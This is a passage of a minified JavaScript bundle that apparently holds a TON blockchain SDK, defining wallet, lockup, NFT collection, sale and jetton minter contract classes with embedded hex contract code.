            "B5EE9C724101010100630000C2FF0020DD2082014C97BA218201339CBAB19C71B0ED44D0D31FD70BFFE304E0A4F2608308D71820D31FD31F01F823BBF263ED44D0D31FD3FFD15131BAF2A103F901541042F910F2A2F800029320D74A96D307D402FB00E8D1A4C8CB1FCBFFC9ED54044CD7A1",
          )),
            super(t, e));
        }
        getName() {
          return "v2R2";
        }
      }
      t.exports = {
        WalletV2ContractR1: WalletV2ContractR1,
        WalletV2ContractR2: WalletV2ContractR2,
      };
    },
    8160: function (t, e, r) {
      const { Cell: n } = r(2917),
        { WalletContract: i } = r(3904),
        { parseWalletV3TransferQuery: s, parseWalletV3TransferBody: o } =
          r(5251);
      class WalletV3ContractBase extends i {
        createSigningMessage(t, e) {
          ((t = t || 0), (e = e || Math.floor(Date.now() / 1e3) + 60));
          const r = new n();
          if ((r.bits.writeUint(this.options.walletId, 32), 0 === t))
            for (let n = 0; n < 32; n++) r.bits.writeBit(1);
          else r.bits.writeUint(e, 32);
          return (r.bits.writeUint(t, 32), r);
        }
        createDataCell() {
          const t = new n();
          return (
            t.bits.writeUint(0, 32),
            t.bits.writeUint(this.options.walletId, 32),
            t.bits.writeBytes(this.options.publicKey),
            t
          );
        }
      }
      class WalletV3ContractR1 extends WalletV3ContractBase {
        constructor(t, e) {
          ((e.code = n.oneFromBoc(
            "B5EE9C724101010100620000C0FF0020DD2082014C97BA9730ED44D0D70B1FE0A4F2608308D71820D31FD31FD31FF82313BBF263ED44D0D31FD31FD3FFD15132BAF2A15144BAF2A204F901541055F910F2A3F8009320D74A96D307D402FB00E8D101A4C8CB1FCB1FCBFFC9ED543FBE6EE0",
          )),
            super(t, e),
            this.options.walletId ||
              (this.options.walletId = 698983191 + this.options.wc));
        }
        getName() {
          return "v3R1";
        }
      }
      ((WalletV3ContractR1.parseTransferQuery = s),
        (WalletV3ContractR1.parseTransferBody = o));
      class WalletV3ContractR2 extends WalletV3ContractBase {
        constructor(t, e) {
          ((e.code = n.oneFromBoc(
            "B5EE9C724101010100710000DEFF0020DD2082014C97BA218201339CBAB19F71B0ED44D0D31FD31F31D70BFFE304E0A4F2608308D71820D31FD31FD31FF82313BBF263ED44D0D31FD31FD3FFD15132BAF2A15144BAF2A204F901541055F910F2A3F8009320D74A96D307D402FB00E8D101A4C8CB1FCB1FCBFFC9ED5410BD6DAD",
          )),
            super(t, e),
            this.options.walletId ||
              (this.options.walletId = 698983191 + this.options.wc));
        }
        getName() {
          return "v3R2";
        }
      }
      ((WalletV3ContractR2.parseTransferQuery = s),
        (WalletV3ContractR2.parseTransferBody = o),
        (t.exports = {
          WalletV3ContractR1: WalletV3ContractR1,
          WalletV3ContractR2: WalletV3ContractR2,
        }));
    },
    8161: function (t, e, r) {
      const { Cell: n } = r(2917),
        { Contract: i } = r(3061),
        { Address: s, bytesToHex: o, BN: a } = r(2916),
        { WalletContract: l } = r(3904),
        { parseWalletV3TransferQuery: h, parseWalletV3TransferBody: c } =
          r(5251);
      class WalletV4ContractR1 extends l {
        constructor(t, e) {
          ((e.code = n.oneFromBoc(
            "B5EE9C72410215010002F5000114FF00F4A413F4BCF2C80B010201200203020148040504F8F28308D71820D31FD31FD31F02F823BBF263ED44D0D31FD31FD3FFF404D15143BAF2A15151BAF2A205F901541064F910F2A3F80024A4C8CB1F5240CB1F5230CBFF5210F400C9ED54F80F01D30721C0009F6C519320D74A96D307D402FB00E830E021C001E30021C002E30001C0039130E30D03A4C8CB1F12CB1FCBFF1112131403EED001D0D3030171B0915BE021D749C120915BE001D31F218210706C7567BD228210626C6E63BDB022821064737472BDB0925F03E002FA403020FA4401C8CA07CBFFC9D0ED44D0810140D721F404305C810108F40A6FA131B3925F05E004D33FC8258210706C7567BA9131E30D248210626C6E63BAE30004060708020120090A005001FA00F404308210706C7567831EB17080185005CB0527CF165003FA02F40012CB69CB1F5210CB3F0052F8276F228210626C6E63831EB17080185005CB0527CF1624FA0214CB6A13CB1F5230CB3F01FA02F4000092821064737472BA8E3504810108F45930ED44D0810140D720C801CF16F400C9ED54821064737472831EB17080185004CB0558CF1622FA0212CB6ACB1FCB3F9410345F04E2C98040FB000201200B0C0059BD242B6F6A2684080A06B90FA0218470D4080847A4937D29910CE6903E9FF9837812801B7810148987159F31840201580D0E0011B8C97ED44D0D70B1F8003DB29DFB513420405035C87D010C00B23281F2FFF274006040423D029BE84C600201200F100019ADCE76A26840206B90EB85FFC00019AF1DF6A26840106B90EB858FC0006ED207FA00D4D422F90005C8CA0715CBFFC9D077748018C8CB05CB0222CF165005FA0214CB6B12CCCCC971FB00C84014810108F451F2A702006C810108D718C8542025810108F451F2A782106E6F746570748018C8CB05CB025004CF16821005F5E100FA0213CB6A12CB1FC971FB00020072810108D718305202810108F459F2A7F82582106473747270748018C8CB05CB025005CF16821005F5E100FA0214CB6A13CB1F12CB3FC973FB00000AF400C9ED5446A9F34F",
          )),
            super(t, e),
            this.options.walletId ||
              (this.options.walletId = 698983191 + this.options.wc),
            (this.methods.getPublicKey = this.getPublicKey.bind(this)));
        }
        getName() {
          return "v4R1";
        }
        createSigningMessage(t, e, r) {
          ((t = t || 0), (e = e || Math.floor(Date.now() / 1e3) + 60));
          const i = new n();
          if ((i.bits.writeUint(this.options.walletId, 32), 0 === t))
            for (let n = 0; n < 32; n++) i.bits.writeBit(1);
          else i.bits.writeUint(e, 32);
          return (i.bits.writeUint(t, 32), r || i.bits.writeUint(0, 8), i);
        }
        createDataCell() {
          const t = new n();
          return (
            t.bits.writeUint(0, 32),
            t.bits.writeUint(this.options.walletId, 32),
            t.bits.writeBytes(this.options.publicKey),
            t.bits.writeUint(0, 1),
            t
          );
        }
        async getPublicKey() {
          const t = await this.getAddress();
          return this.provider.call2(t.toString(), "get_public_key");
        }
      }
      ((WalletV4ContractR1.parseTransferQuery = h),
        (WalletV4ContractR1.parseTransferBody = c),
        (t.exports = { WalletV4ContractR1: WalletV4ContractR1 }));
    },
    8162: function (t, e, r) {
      const { Cell: n } = r(2917),
        { Contract: i } = r(3061),
        { Address: s, bytesToHex: o, BN: a, toNano: l } = r(2916),
        { WalletContract: h } = r(3904),
        { parseWalletV3TransferQuery: c, parseWalletV3TransferBody: u } =
          r(5251);
      class WalletV4ContractR2 extends h {
        constructor(t, e) {
          ((e.code = n.oneFromBoc(
            "B5EE9C72410214010002D4000114FF00F4A413F4BCF2C80B010201200203020148040504F8F28308D71820D31FD31FD31F02F823BBF264ED44D0D31FD31FD3FFF404D15143BAF2A15151BAF2A205F901541064F910F2A3F80024A4C8CB1F5240CB1F5230CBFF5210F400C9ED54F80F01D30721C0009F6C519320D74A96D307D402FB00E830E021C001E30021C002E30001C0039130E30D03A4C8CB1F12CB1FCBFF1011121302E6D001D0D3032171B0925F04E022D749C120925F04E002D31F218210706C7567BD22821064737472BDB0925F05E003FA403020FA4401C8CA07CBFFC9D0ED44D0810140D721F404305C810108F40A6FA131B3925F07E005D33FC8258210706C7567BA923830E30D03821064737472BA925F06E30D06070201200809007801FA00F40430F8276F2230500AA121BEF2E0508210706C7567831EB17080185004CB0526CF1658FA0219F400CB6917CB1F5260CB3F20C98040FB0006008A5004810108F45930ED44D0810140D720C801CF16F400C9ED540172B08E23821064737472831EB17080185005CB055003CF1623FA0213CB6ACB1FCB3FC98040FB00925F03E20201200A0B0059BD242B6F6A2684080A06B90FA0218470D4080847A4937D29910CE6903E9FF9837812801B7810148987159F31840201580C0D0011B8C97ED44D0D70B1F8003DB29DFB513420405035C87D010C00B23281F2FFF274006040423D029BE84C600201200E0F0019ADCE76A26840206B90EB85FFC00019AF1DF6A26840106B90EB858FC0006ED207FA00D4D422F90005C8CA0715CBFFC9D077748018C8CB05CB0222CF165005FA0214CB6B12CCCCC973FB00C84014810108F451F2A7020070810108D718FA00D33FC8542047810108F451F2A782106E6F746570748018C8CB05CB025006CF165004FA0214CB6A12CB1FCB3FC973FB0002006C810108D718FA00D33F305224810108F459F2A782106473747270748018C8CB05CB025005CF165003FA0213CB6ACB1F12CB3FC973FB00000AF400C9ED54696225E5",
          )),
            super(t, e),
            this.options.walletId ||
              (this.options.walletId = 698983191 + this.options.wc),
            (this.methods.deployAndInstallPlugin = (e) =>
              i.createMethod(t, this.deployAndInstallPlugin(e))),
            (this.methods.installPlugin = (e) =>
              i.createMethod(t, this.installPlugin(e))),
            (this.methods.removePlugin = (e) =>
              i.createMethod(t, this.removePlugin(e))),
            (this.methods.getPublicKey = this.getPublicKey.bind(this)),
            (this.methods.getWalletId = this.getWalletId.bind(this)),
            (this.methods.isPluginInstalled =
              this.isPluginInstalled.bind(this)),
            (this.methods.getPluginsList = this.getPluginsList.bind(this)));
        }
        getName() {
          return "v4R2";
        }
        createSigningMessage(t, e, r) {
          ((t = t || 0), (e = e || Math.floor(Date.now() / 1e3) + 60));
          const i = new n();
          if ((i.bits.writeUint(this.options.walletId, 32), 0 === t))
            for (let n = 0; n < 32; n++) i.bits.writeBit(1);
          else i.bits.writeUint(e, 32);
          return (i.bits.writeUint(t, 32), r || i.bits.writeUint(0, 8), i);
        }
        createDataCell() {
          const t = new n();
          return (
            t.bits.writeUint(0, 32),
            t.bits.writeUint(this.options.walletId, 32),
            t.bits.writeBytes(this.options.publicKey),
            t.bits.writeUint(0, 1),
            t
          );
        }
        async deployAndInstallPlugin(t) {
          const {
              secretKey: e,
              seqno: r,
              pluginWc: n,
              amount: i,
              stateInit: s,
              body: o,
              expireAt: a,
            } = t,
            l = this.createSigningMessage(r, a, !0);
          return (
            l.bits.writeUint(1, 8),
            l.bits.writeInt(n, 8),
            l.bits.writeGrams(i),
            l.refs.push(s),
            l.refs.push(o),
            this.createExternalMessage(l, e, r, !1)
          );
        }
        async _setPlugin(t, e) {
          const {
              secretKey: r,
              seqno: n,
              amount: i,
              queryId: o,
              expireAt: a,
            } = t,
            h = new s(t.pluginAddress),
            c = this.createSigningMessage(n, a, !0);
          return (
            c.bits.writeUint(e ? 2 : 3, 8),
            c.bits.writeInt(h.wc, 8),
            c.bits.writeBytes(h.hashPart),
            c.bits.writeGrams(i || l("0.1")),
            c.bits.writeUint(o || 0, 64),
            this.createExternalMessage(c, r, n, !1)
          );
        }
        async installPlugin(t) {
          return this._setPlugin(t, !0);
        }
        async removePlugin(t) {
          return this._setPlugin(t, !1);
        }
        async getWalletId() {
          const t = await this.getAddress(),
            e = await this.provider.call2(t.toString(), "get_subwallet_id");
          return e.toNumber();
        }
        async getPublicKey() {
          const t = await this.getAddress();
          return this.provider.call2(t.toString(), "get_public_key");
        }
        async isPluginInstalled(t) {
          t = new s(t);
          const e = "0x" + o(t.hashPart),
            r = await this.getAddress(),
            n = await this.provider.call2(r.toString(), "is_plugin_installed", [
              ["num", t.wc],
              ["num", e],
            ]);
          return !n.isZero();
        }
        async getPluginsList() {
          const t = (t) => t[0].toNumber() + ":" + t[1].toString(16),
            e = await this.getAddress(),
            r = await this.provider.call2(e.toString(), "get_plugin_list");
          return r.map(t);
        }
      }
      ((WalletV4ContractR2.parseTransferQuery = c),
        (WalletV4ContractR2.parseTransferBody = u),
        (t.exports = { WalletV4ContractR2: WalletV4ContractR2 }));
    },
    8163: function (t, e, r) {
      const { Cell: n } = r(2917),
        {
          Address: i,
          BN: s,
          toNano: o,
          bytesToHex: a,
          hexToBytes: l,
          nacl: h,
          stringToBytes: c,
          bytesToBase64: u,
          base64ToBytes: d,
        } = r(2916),
        { Contract: f } = r(3061),
        { WalletContract: p } = r(3904),
        w = 698983191;
      class LockupWalletV1 extends p {
        constructor(t, e) {
          ((e.code = n.oneFromBoc(
            "B5EE9C7241021E01000261000114FF00F4A413F4BCF2C80B010201200203020148040501F2F28308D71820D31FD31FD31F802403F823BB13F2F2F003802251A9BA1AF2F4802351B7BA1BF2F4801F0BF9015410C5F9101AF2F4F8005057F823F0065098F823F0062071289320D74A8E8BD30731D4511BDB3C12B001E8309229A0DF72FB02069320D74A96D307D402FB00E8D103A4476814154330F004ED541D0202CD0607020120131402012008090201200F100201200A0B002D5ED44D0D31FD31FD3FFD3FFF404FA00F404FA00F404D1803F7007434C0C05C6C2497C0F83E900C0871C02497C0F80074C7C87040A497C1383C00D46D3C00608420BABE7114AC2F6C2497C338200A208420BABE7106EE86BCBD20084AE0840EE6B2802FBCBD01E0C235C62008087E4055040DBE4404BCBD34C7E00A60840DCEAA7D04EE84BCBD34C034C7CC0078C3C412040DD78CA00C0D0E00130875D27D2A1BE95B0C60000C1039480AF00500161037410AF0050810575056001010244300F004ED540201201112004548E1E228020F4966FA520933023BB9131E2209835FA00D113A14013926C21E2B3E6308003502323287C5F287C572FFC4F2FFFD00007E80BD00007E80BD00326000431448A814C4E0083D039BE865BE803444E800A44C38B21400FE809004E0083D10C06002012015160015BDE9F780188242F847800C02012017180201481B1C002DB5187E006D88868A82609E00C6207E00C63F04EDE20B30020158191A0017ADCE76A268699F98EB85FFC00017AC78F6A268698F98EB858FC00011B325FB513435C2C7E00017B1D1BE08E0804230FB50F620002801D0D3030178B0925B7FE0FA4031FA403001F001A80EDAA4",
          )),
            super(t, e),
            this.options.walletId ||
              (this.options.walletId = w + this.options.wc),
            (this.methods.getPublicKey = this.getPublicKey.bind(this)),
            (this.methods.getWalletId = this.getWalletId.bind(this)),
            (this.methods.getLiquidBalance = this.getLiquidBalance.bind(this)),
            (this.methods.getNominalRestrictedBalance =
              this.getNominalRestrictedBalance.bind(this)),
            (this.methods.getNominalLockedBalance =
              this.getNominalLockedBalance.bind(this)));
        }
        getName() {
          return "lockup-0.1";
        }
        createSigningMessage(t, e) {
          t = t || 0;
          const r = new n();
          if ((r.bits.writeUint(this.options.walletId, 32), 0 === t))
            for (let n = 0; n < 32; n++) r.bits.writeBit(1);
          else {
            const t = new Date(),
              e = Math.floor(t.getTime() / 1e3);
            r.bits.writeUint(e + 60, 32);
          }
          return (r.bits.writeUint(t, 32), r);
        }
        createDataCell() {
          const t = new n();
          return (
            t.bits.writeUint(0, 32),
            t.bits.writeUint(this.options.walletId, 32),
            t.bits.writeBytes(this.options.publicKey),
            t.bits.writeBytes(d(this.options.config.config_public_key)),
            this.options.config.allowed_destinations
              ? (t.bits.writeUint(1, 1),
                t.refs.push(
                  n.oneFromBoc(d(this.options.config.allowed_destinations)),
                ))
              : t.bits.writeUint(0, 1),
            t.bits.writeGrams(0),
            t.bits.writeUint(0, 1),
            t.bits.writeGrams(0),
            t.bits.writeUint(0, 1),
            t
          );
        }
        async getWalletId() {
          const t = await this.getAddress(),
            e = await this.provider.call2(t.toString(), "get_subwallet_id");
          return e.toNumber();
        }
        async getPublicKey() {
          const t = await this.getAddress();
          return this.provider.call2(t.toString(), "get_public_key");
        }
        async getLiquidBalance() {
          const t = await this.getBalances();
          return t[0] - t[1] - t[2];
        }
        async getNominalRestrictedBalance() {
          return await this.getBalances()[1];
        }
        async getNominalLockedBalance() {
          return await this.getBalances()[2];
        }
        async getBalances() {
          const t = await this.getAddress();
          return this.provider.call2(t.toString(), "get_balances");
        }
      }
      t.exports.default = {
        LockupWalletV1: LockupWalletV1,
        all: { "lockup-0.1": LockupWalletV1 },
        list: [LockupWalletV1],
      };
    },
    8164: function (t, e, r) {
      const { NftCollection: n } = r(8165),
        { NftItem: i } = r(8166),
        { NftMarketplace: s } = r(8167),
        { NftSale: o } = r(8168);
      t.exports.default = {
        NftCollection: n,
        NftItem: i,
        NftMarketplace: s,
        NftSale: o,
      };
    },
    8165: function (t, e, r) {
      const { Contract: n } = r(3061),
        { Cell: i } = r(2917),
        { Address: s, bytesToBase64: o, BN: a } = r(2916),
        { parseAddress: l } = r(3184),
        {
          createOffchainUriCell: h,
          serializeUri: c,
          parseOffchainUriCell: u,
          getRoyaltyParams: d,
        } = r(3184);
      class NftCollection extends n {
        constructor(t, e) {
          if (
            ((e.wc = 0),
            (e.code =
              e.code ||
              i.oneFromBoc(
                "B5EE9C724102140100021F000114FF00F4A413F4BCF2C80B0102016202030202CD04050201200E0F04E7D10638048ADF000E8698180B8D848ADF07D201800E98FE99FF6A2687D20699FEA6A6A184108349E9CA829405D47141BAF8280E8410854658056B84008646582A802E78B127D010A65B509E58FE59F80E78B64C0207D80701B28B9E382F970C892E000F18112E001718112E001F181181981E0024060708090201200A0B00603502D33F5313BBF2E1925313BA01FA00D43028103459F0068E1201A44343C85005CF1613CB3FCCCCCCC9ED54925F05E200A6357003D4308E378040F4966FA5208E2906A4208100FABE93F2C18FDE81019321A05325BBF2F402FA00D43022544B30F00623BA9302A402DE04926C21E2B3E6303250444313C85005CF1613CB3FCCCCCCC9ED54002C323401FA40304144C85005CF1613CB3FCCCCCCC9ED54003C8E15D4D43010344130C85005CF1613CB3FCCCCCCC9ED54E05F04840FF2F00201200C0D003D45AF0047021F005778018C8CB0558CF165004FA0213CB6B12CCCCC971FB008002D007232CFFE0A33C5B25C083232C044FD003D0032C03260001B3E401D3232C084B281F2FFF2742002012010110025BC82DF6A2687D20699FEA6A6A182DE86A182C40043B8B5D31ED44D0FA40D33FD4D4D43010245F04D0D431D430D071C8CB0701CF16CCC980201201213002FB5DAFDA89A1F481A67FA9A9A860D883A1A61FA61FF480610002DB4F47DA89A1F481A67FA9A9A86028BE09E008E003E00B01A500C6E",
              )),
            e.royalty > 1)
          )
            throw new Error("royalty > 1");
          ((e.royaltyBase = 1e3),
            (e.royaltyFactor = Math.floor(e.royalty * e.royaltyBase)),
            super(t, e),
            (this.methods.getCollectionData =
              this.getCollectionData.bind(this)),
            (this.methods.getNftItemAddressByIndex =
              this.getNftItemAddressByIndex.bind(this)),
            (this.methods.getNftItemContent =
              this.getNftItemContent.bind(this)),
            (this.methods.getRoyaltyParams = this.getRoyaltyParams.bind(this)));
        }
        createContentCell(t) {
          const e = h(t.collectionContentUri),
            r = new i();
          r.bits.writeBytes(c(t.nftItemContentBaseUri));
          const n = new i();
          return ((n.refs[0] = e), (n.refs[1] = r), n);
        }
        createRoyaltyCell(t) {
          const e = new i();
          return (
            e.bits.writeUint(t.royaltyFactor, 16),
            e.bits.writeUint(t.royaltyBase, 16),
            e.bits.writeAddress(t.royaltyAddress),
            e
          );
        }
        createDataCell() {
          const t = new i();
          return (
            t.bits.writeAddress(this.options.ownerAddress),
            t.bits.writeUint(0, 64),
            (t.refs[0] = this.createContentCell(this.options)),
            (t.refs[1] = i.oneFromBoc(this.options.nftItemCodeHex)),
            (t.refs[2] = this.createRoyaltyCell(this.options)),
            t
          );
        }
        createMintBody(t) {
          const e = new i();
          (e.bits.writeUint(1, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            e.bits.writeUint(t.itemIndex, 64),
            e.bits.writeCoins(t.amount));
          const r = new i();
          r.bits.writeAddress(t.itemOwnerAddress);
          const n = new i();
          return (
            n.bits.writeBytes(c(t.itemContentUri)),
            (r.refs[0] = n),
            (e.refs[0] = r),
            e
          );
        }
        createGetRoyaltyParamsBody(t) {
          const e = new i();
          return (
            e.bits.writeUint(1765620048, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            e
          );
        }
        createChangeOwnerBody(t) {
          if (void 0 === t.newOwnerAddress)
            throw new Error("Specify newOwnerAddress");
          const e = new i();
          return (
            e.bits.writeUint(3, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            e.bits.writeAddress(t.newOwnerAddress),
            e
          );
        }
        createEditContentBody(t) {
          if (t.royalty > 1) throw new Error("royalty > 1");
          ((t.royaltyBase = 1e3),
            (t.royaltyFactor = Math.floor(t.royalty * t.royaltyBase)));
          const e = new i();
          return (
            e.bits.writeUint(4, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            (e.refs[0] = this.createContentCell(t)),
            (e.refs[1] = this.createRoyaltyCell(t)),
            e
          );
        }
        async getCollectionData() {
          const t = await this.getAddress(),
            e = await this.provider.call2(t.toString(), "get_collection_data"),
            r = e[0];
          let n = NaN;
          try {
            n = r.toNumber();
          } catch (a) {}
          const i = e[1];
          let s = null;
          try {
            s = u(i);
          } catch (a) {}
          const o = l(e[2]);
          return {
            nextItemIndex: n,
            itemsCount: r,
            ownerAddress: o,
            collectionContentCell: i,
            collectionContentUri: s,
          };
        }
        async getNftItemContent(t) {
          const e = await this.getAddress(),
            r = await t.getData();
          if (r.isInitialized) {
            const t = await this.provider.call2(
              e.toString(),
              "get_nft_content",
              [
                ["num", r.itemIndex.toString(10)],
                ["tvm.Cell", o(await r.contentCell.toBoc(!1))],
              ],
            );
            r.contentUri = null;
            try {
              r.contentUri = u(t);
            } catch (n) {}
          }
          return r;
        }
        async getNftItemAddressByIndex(t) {
          t = new a(t);
          const e = await this.getAddress(),
            r = await this.provider.call2(
              e.toString(),
              "get_nft_address_by_index",
              [["num", t.toString(10)]],
            );
          return l(r);
        }
        async getRoyaltyParams() {
          const t = await this.getAddress();
          return d(this.provider, t.toString());
        }
      }
      t.exports = { NftCollection: NftCollection };
    },
    8166: function (t, e, r) {
      const { Contract: n } = r(3061),
        { Cell: i } = r(2917),
        { Address: s, BN: o } = r(2916),
        { parseAddress: a, getRoyaltyParams: l } = r(3184),
        { parseOffchainUriCell: h } = r(3184),
        c =
          "B5EE9C7241020D010001D0000114FF00F4A413F4BCF2C80B0102016202030202CE04050009A11F9FE00502012006070201200B0C02D70C8871C02497C0F83434C0C05C6C2497C0F83E903E900C7E800C5C75C87E800C7E800C3C00812CE3850C1B088D148CB1C17CB865407E90350C0408FC00F801B4C7F4CFE08417F30F45148C2EA3A1CC840DD78C9004F80C0D0D0D4D60840BF2C9A884AEB8C097C12103FCBC20080900113E910C1C2EBCB8536001F65135C705F2E191FA4021F001FA40D20031FA00820AFAF0801BA121945315A0A1DE22D70B01C300209206A19136E220C2FFF2E192218E3E821005138D91C85009CF16500BCF16712449145446A0708010C8CB055007CF165005FA0215CB6A12CB1FCB3F226EB39458CF17019132E201C901FB00104794102A375BE20A00727082108B77173505C8CBFF5004CF1610248040708010C8CB055007CF165005FA0215CB6A12CB1FCB3F226EB39458CF17019132E201C901FB000082028E3526F0018210D53276DB103744006D71708010C8CB055007CF165005FA0215CB6A12CB1FCB3F226EB39458CF17019132E201C901FB0093303234E25502F003003B3B513434CFFE900835D27080269FC07E90350C04090408F80C1C165B5B60001D00F232CFD633C58073C5B3327B5520BF75041B";
      class NftItem extends n {
        constructor(t, e) {
          ((e.wc = 0),
            (e.code = e.code || i.oneFromBoc(c)),
            super(t, e),
            (this.methods.getData = this.getData.bind(this)));
        }
        createDataCell() {
          const t = new i();
          return (
            t.bits.writeUint(this.options.index, 64),
            t.bits.writeAddress(this.options.collectionAddress),
            t
          );
        }
        async getData() {
          const t = await this.getAddress(),
            e = await this.provider.call2(t.toString(), "get_nft_data"),
            r = -1 === e[0].toNumber(),
            n = e[1];
          let i = NaN;
          try {
            i = n.toNumber();
          } catch (u) {}
          const s = a(e[2]),
            o = r ? a(e[3]) : null,
            l = e[4];
          let c = null;
          try {
            c = r && null === s ? h(l) : null;
          } catch (u) {}
          return {
            isInitialized: r,
            index: i,
            itemIndex: n,
            collectionAddress: s,
            ownerAddress: o,
            contentCell: l,
            contentUri: c,
          };
        }
        async createTransferBody(t) {
          const e = new i();
          return (
            e.bits.writeUint(1607220500, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            e.bits.writeAddress(t.newOwnerAddress),
            e.bits.writeAddress(t.responseAddress),
            e.bits.writeBit(!1),
            e.bits.writeCoins(t.forwardAmount || new o(0)),
            e.bits.writeBit(!1),
            t.forwardPayload && e.bits.writeBytes(t.forwardPayload),
            e
          );
        }
        createGetStaticDataBody(t) {
          const e = new i();
          return (
            e.bits.writeUint(801842850, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            e
          );
        }
        async getRoyaltyParams() {
          const t = await this.getAddress();
          return l(this.provider, t.toString());
        }
      }
      ((NftItem.codeHex = c), (t.exports = { NftItem: NftItem }));
    },
    8167: function (t, e, r) {
      const { Contract: n } = r(3061),
        { Cell: i } = r(2917),
        { Address: s } = r(2916),
        { parseAddress: o } = r(3184);
      class NftMarketplace extends n {
        constructor(t, e) {
          ((e.wc = 0),
            (e.code =
              e.code ||
              i.oneFromBoc(
                "B5EE9C7241010401006D000114FF00F4A413F4BCF2C80B01020120020300AAD23221C700915BE0D0D3030171B0915BE0FA40ED44D0FA403012C705F2E19101D31F01C0018E2BFA003001D4D43021F90070C8CA07CBFFC9D077748018C8CB05CB0258CF165004FA0213CB6BCCCCC971FB00915BE20004F2308EF7CCE7",
              )),
            super(t, e));
        }
        createDataCell() {
          const t = new i();
          return (t.bits.writeAddress(this.options.ownerAddress), t);
        }
      }
      t.exports = { NftMarketplace: NftMarketplace };
    },
    8168: function (t, e, r) {
      const { Contract: n } = r(3061),
        { Cell: i } = r(2917),
        { parseAddress: s } = r(3184),
        { BN: o } = r(2916),
        a =
          "B5EE9C7241020A010001B4000114FF00F4A413F4BCF2C80B01020120020302014804050004F2300202CD0607002FA03859DA89A1F481F481F481F401A861A1F401F481F4006101F7D00E8698180B8D8492F82707D201876A2687D207D207D207D006A18116BA4E10159C71D991B1B2990E382C92F837028916382F970FA01698FC1080289C6C8895D7970FAE99F98FD2018201A642802E78B2801E78B00E78B00FD016664F6AA701363804C9B081B2299823878027003698FE99F9810E000C92F857010C0801F5D41081DCD650029285029185F7970E101E87D007D207D0018384008646582A804E78B28B9D090D0A85AD08A500AFD010AE5B564B8FD80384008646582AC678B2803FD010B65B564B8FD80384008646582A802E78B00FD0109E5B564B8FD80381041082FE61E8A10C00C646582A802E78B117D010A65B509E58F8A40900C8C0029A3110471036454012F004E032363704C0038E4782103B9ACA0015BEF2E1C95312C70559C705B1F2E1CA702082105FCC3D14218010C8CB055006CF1622FA0215CB6A14CB1F14CB3F21CF1601CF16CA0021FA02CA00C98100A0FB00E05F06840FF2F0002ACB3F22CF1658CF16CA0021FA02CA00C98100A0FB00AECABAD1";
      class NftSale extends n {
        constructor(t, e) {
          ((e.wc = 0),
            (e.code = e.code || i.oneFromBoc(a)),
            super(t, e),
            (this.methods.getData = this.getData.bind(this)));
        }
        createDataCell() {
          const t = new i();
          (t.bits.writeAddress(this.options.marketplaceAddress),
            t.bits.writeAddress(this.options.nftAddress),
            t.bits.writeAddress(null),
            t.bits.writeCoins(this.options.fullPrice));
          const e = new i();
          return (
            e.bits.writeCoins(this.options.marketplaceFee),
            e.bits.writeAddress(this.options.royaltyAddress),
            e.bits.writeCoins(this.options.royaltyAmount),
            (t.refs[0] = e),
            t
          );
        }
        async getData() {
          const t = await this.getAddress(),
            e = await this.provider.call2(t.toString(), "get_sale_data"),
            r = s(e[0]),
            n = s(e[1]),
            i = s(e[2]),
            o = e[3],
            a = e[4],
            l = s(e[5]),
            h = e[6];
          return {
            marketplaceAddress: r,
            nftAddress: n,
            nftOwnerAddress: i,
            fullPrice: o,
            marketplaceFee: a,
            royaltyAddress: l,
            royaltyAmount: h,
          };
        }
        async createCancelBody(t) {
          const e = new i();
          return (
            e.bits.writeUint(3, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            e
          );
        }
      }
      ((NftSale.codeHex = a), (t.exports = { NftSale: NftSale }));
    },
    8169: function (t, e, r) {
      const { JettonMinter: n } = r(8170),
        { JettonWallet: i } = r(8171);
      t.exports.default = { JettonMinter: n, JettonWallet: i };
    },
    8170: function (t, e, r) {
      const { Contract: n } = r(3061),
        { Cell: i } = r(2917),
        {
          createOffchainUriCell: s,
          parseOffchainUriCell: o,
          parseAddress: a,
        } = r(3184),
        { Address: l, BN: h, bytesToBase64: c } = r(2916);
      class JettonMinter extends n {
        constructor(t, e) {
          ((e.wc = 0),
            (e.code =
              e.code ||
              i.oneFromBoc(
                "B5EE9C7241020B010001ED000114FF00F4A413F4BCF2C80B0102016202030202CC040502037A60090A03EFD9910E38048ADF068698180B8D848ADF07D201800E98FE99FF6A2687D007D206A6A18400AA9385D47181A9AA8AAE382F9702480FD207D006A18106840306B90FD001812881A28217804502A906428027D012C678B666664F6AA7041083DEECBEF29385D71811A92E001F1811802600271812F82C207F97840607080093DFC142201B82A1009AA0A01E428027D012C678B00E78B666491646580897A007A00658064907C80383A6465816503E5FFE4E83BC00C646582AC678B28027D0109E5B589666664B8FD80400FE3603FA00FA40F82854120870542013541403C85004FA0258CF1601CF16CCC922C8CB0112F400F400CB00C9F9007074C8CB02CA07CBFFC9D05008C705F2E04A12A1035024C85004FA0258CF16CCCCC9ED5401FA403020D70B01C3008E1F8210D53276DB708010C8CB055003CF1622FA0212CB6ACB1FCB3FC98042FB00915BE200303515C705F2E049FA403059C85004FA0258CF16CCCCC9ED54002E5143C705F2E049D43001C85004FA0258CF16CCCCC9ED54007DADBCF6A2687D007D206A6A183618FC1400B82A1009AA0A01E428027D012C678B00E78B666491646580897A007A00658064FC80383A6465816503E5FFE4E840001FAF16F6A2687D007D206A6A183FAA904051007F09",
              )),
            super(t, e));
        }
        createDataCell() {
          const t = new i();
          return (
            t.bits.writeCoins(0),
            t.bits.writeAddress(this.options.adminAddress),
            (t.refs[0] = s(this.options.jettonContentUri)),
            (t.refs[1] = i.oneFromBoc(this.options.jettonWalletCodeHex)),
            t
          );
        }
        createMintBody(t) {
          const e = new i();
          (e.bits.writeUint(21, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            e.bits.writeAddress(t.destination),
            e.bits.writeCoins(t.amount));
          const r = new i();
          return (
            r.bits.writeUint(395134233, 32),
            r.bits.writeUint(t.queryId || 0, 64),
            r.bits.writeCoins(t.jettonAmount),
            r.bits.writeAddress(null),
            r.bits.writeAddress(null),
            r.bits.writeCoins(new h(0)),
            r.bits.writeBit(!1),
            (e.refs[0] = r),
            e
          );
        }
        createChangeAdminBody(t) {
          if (void 0 === t.newAdminAddress)
            throw new Error("Specify newAdminAddress");
          const e = new i();
          return (
            e.bits.writeUint(3, 32),
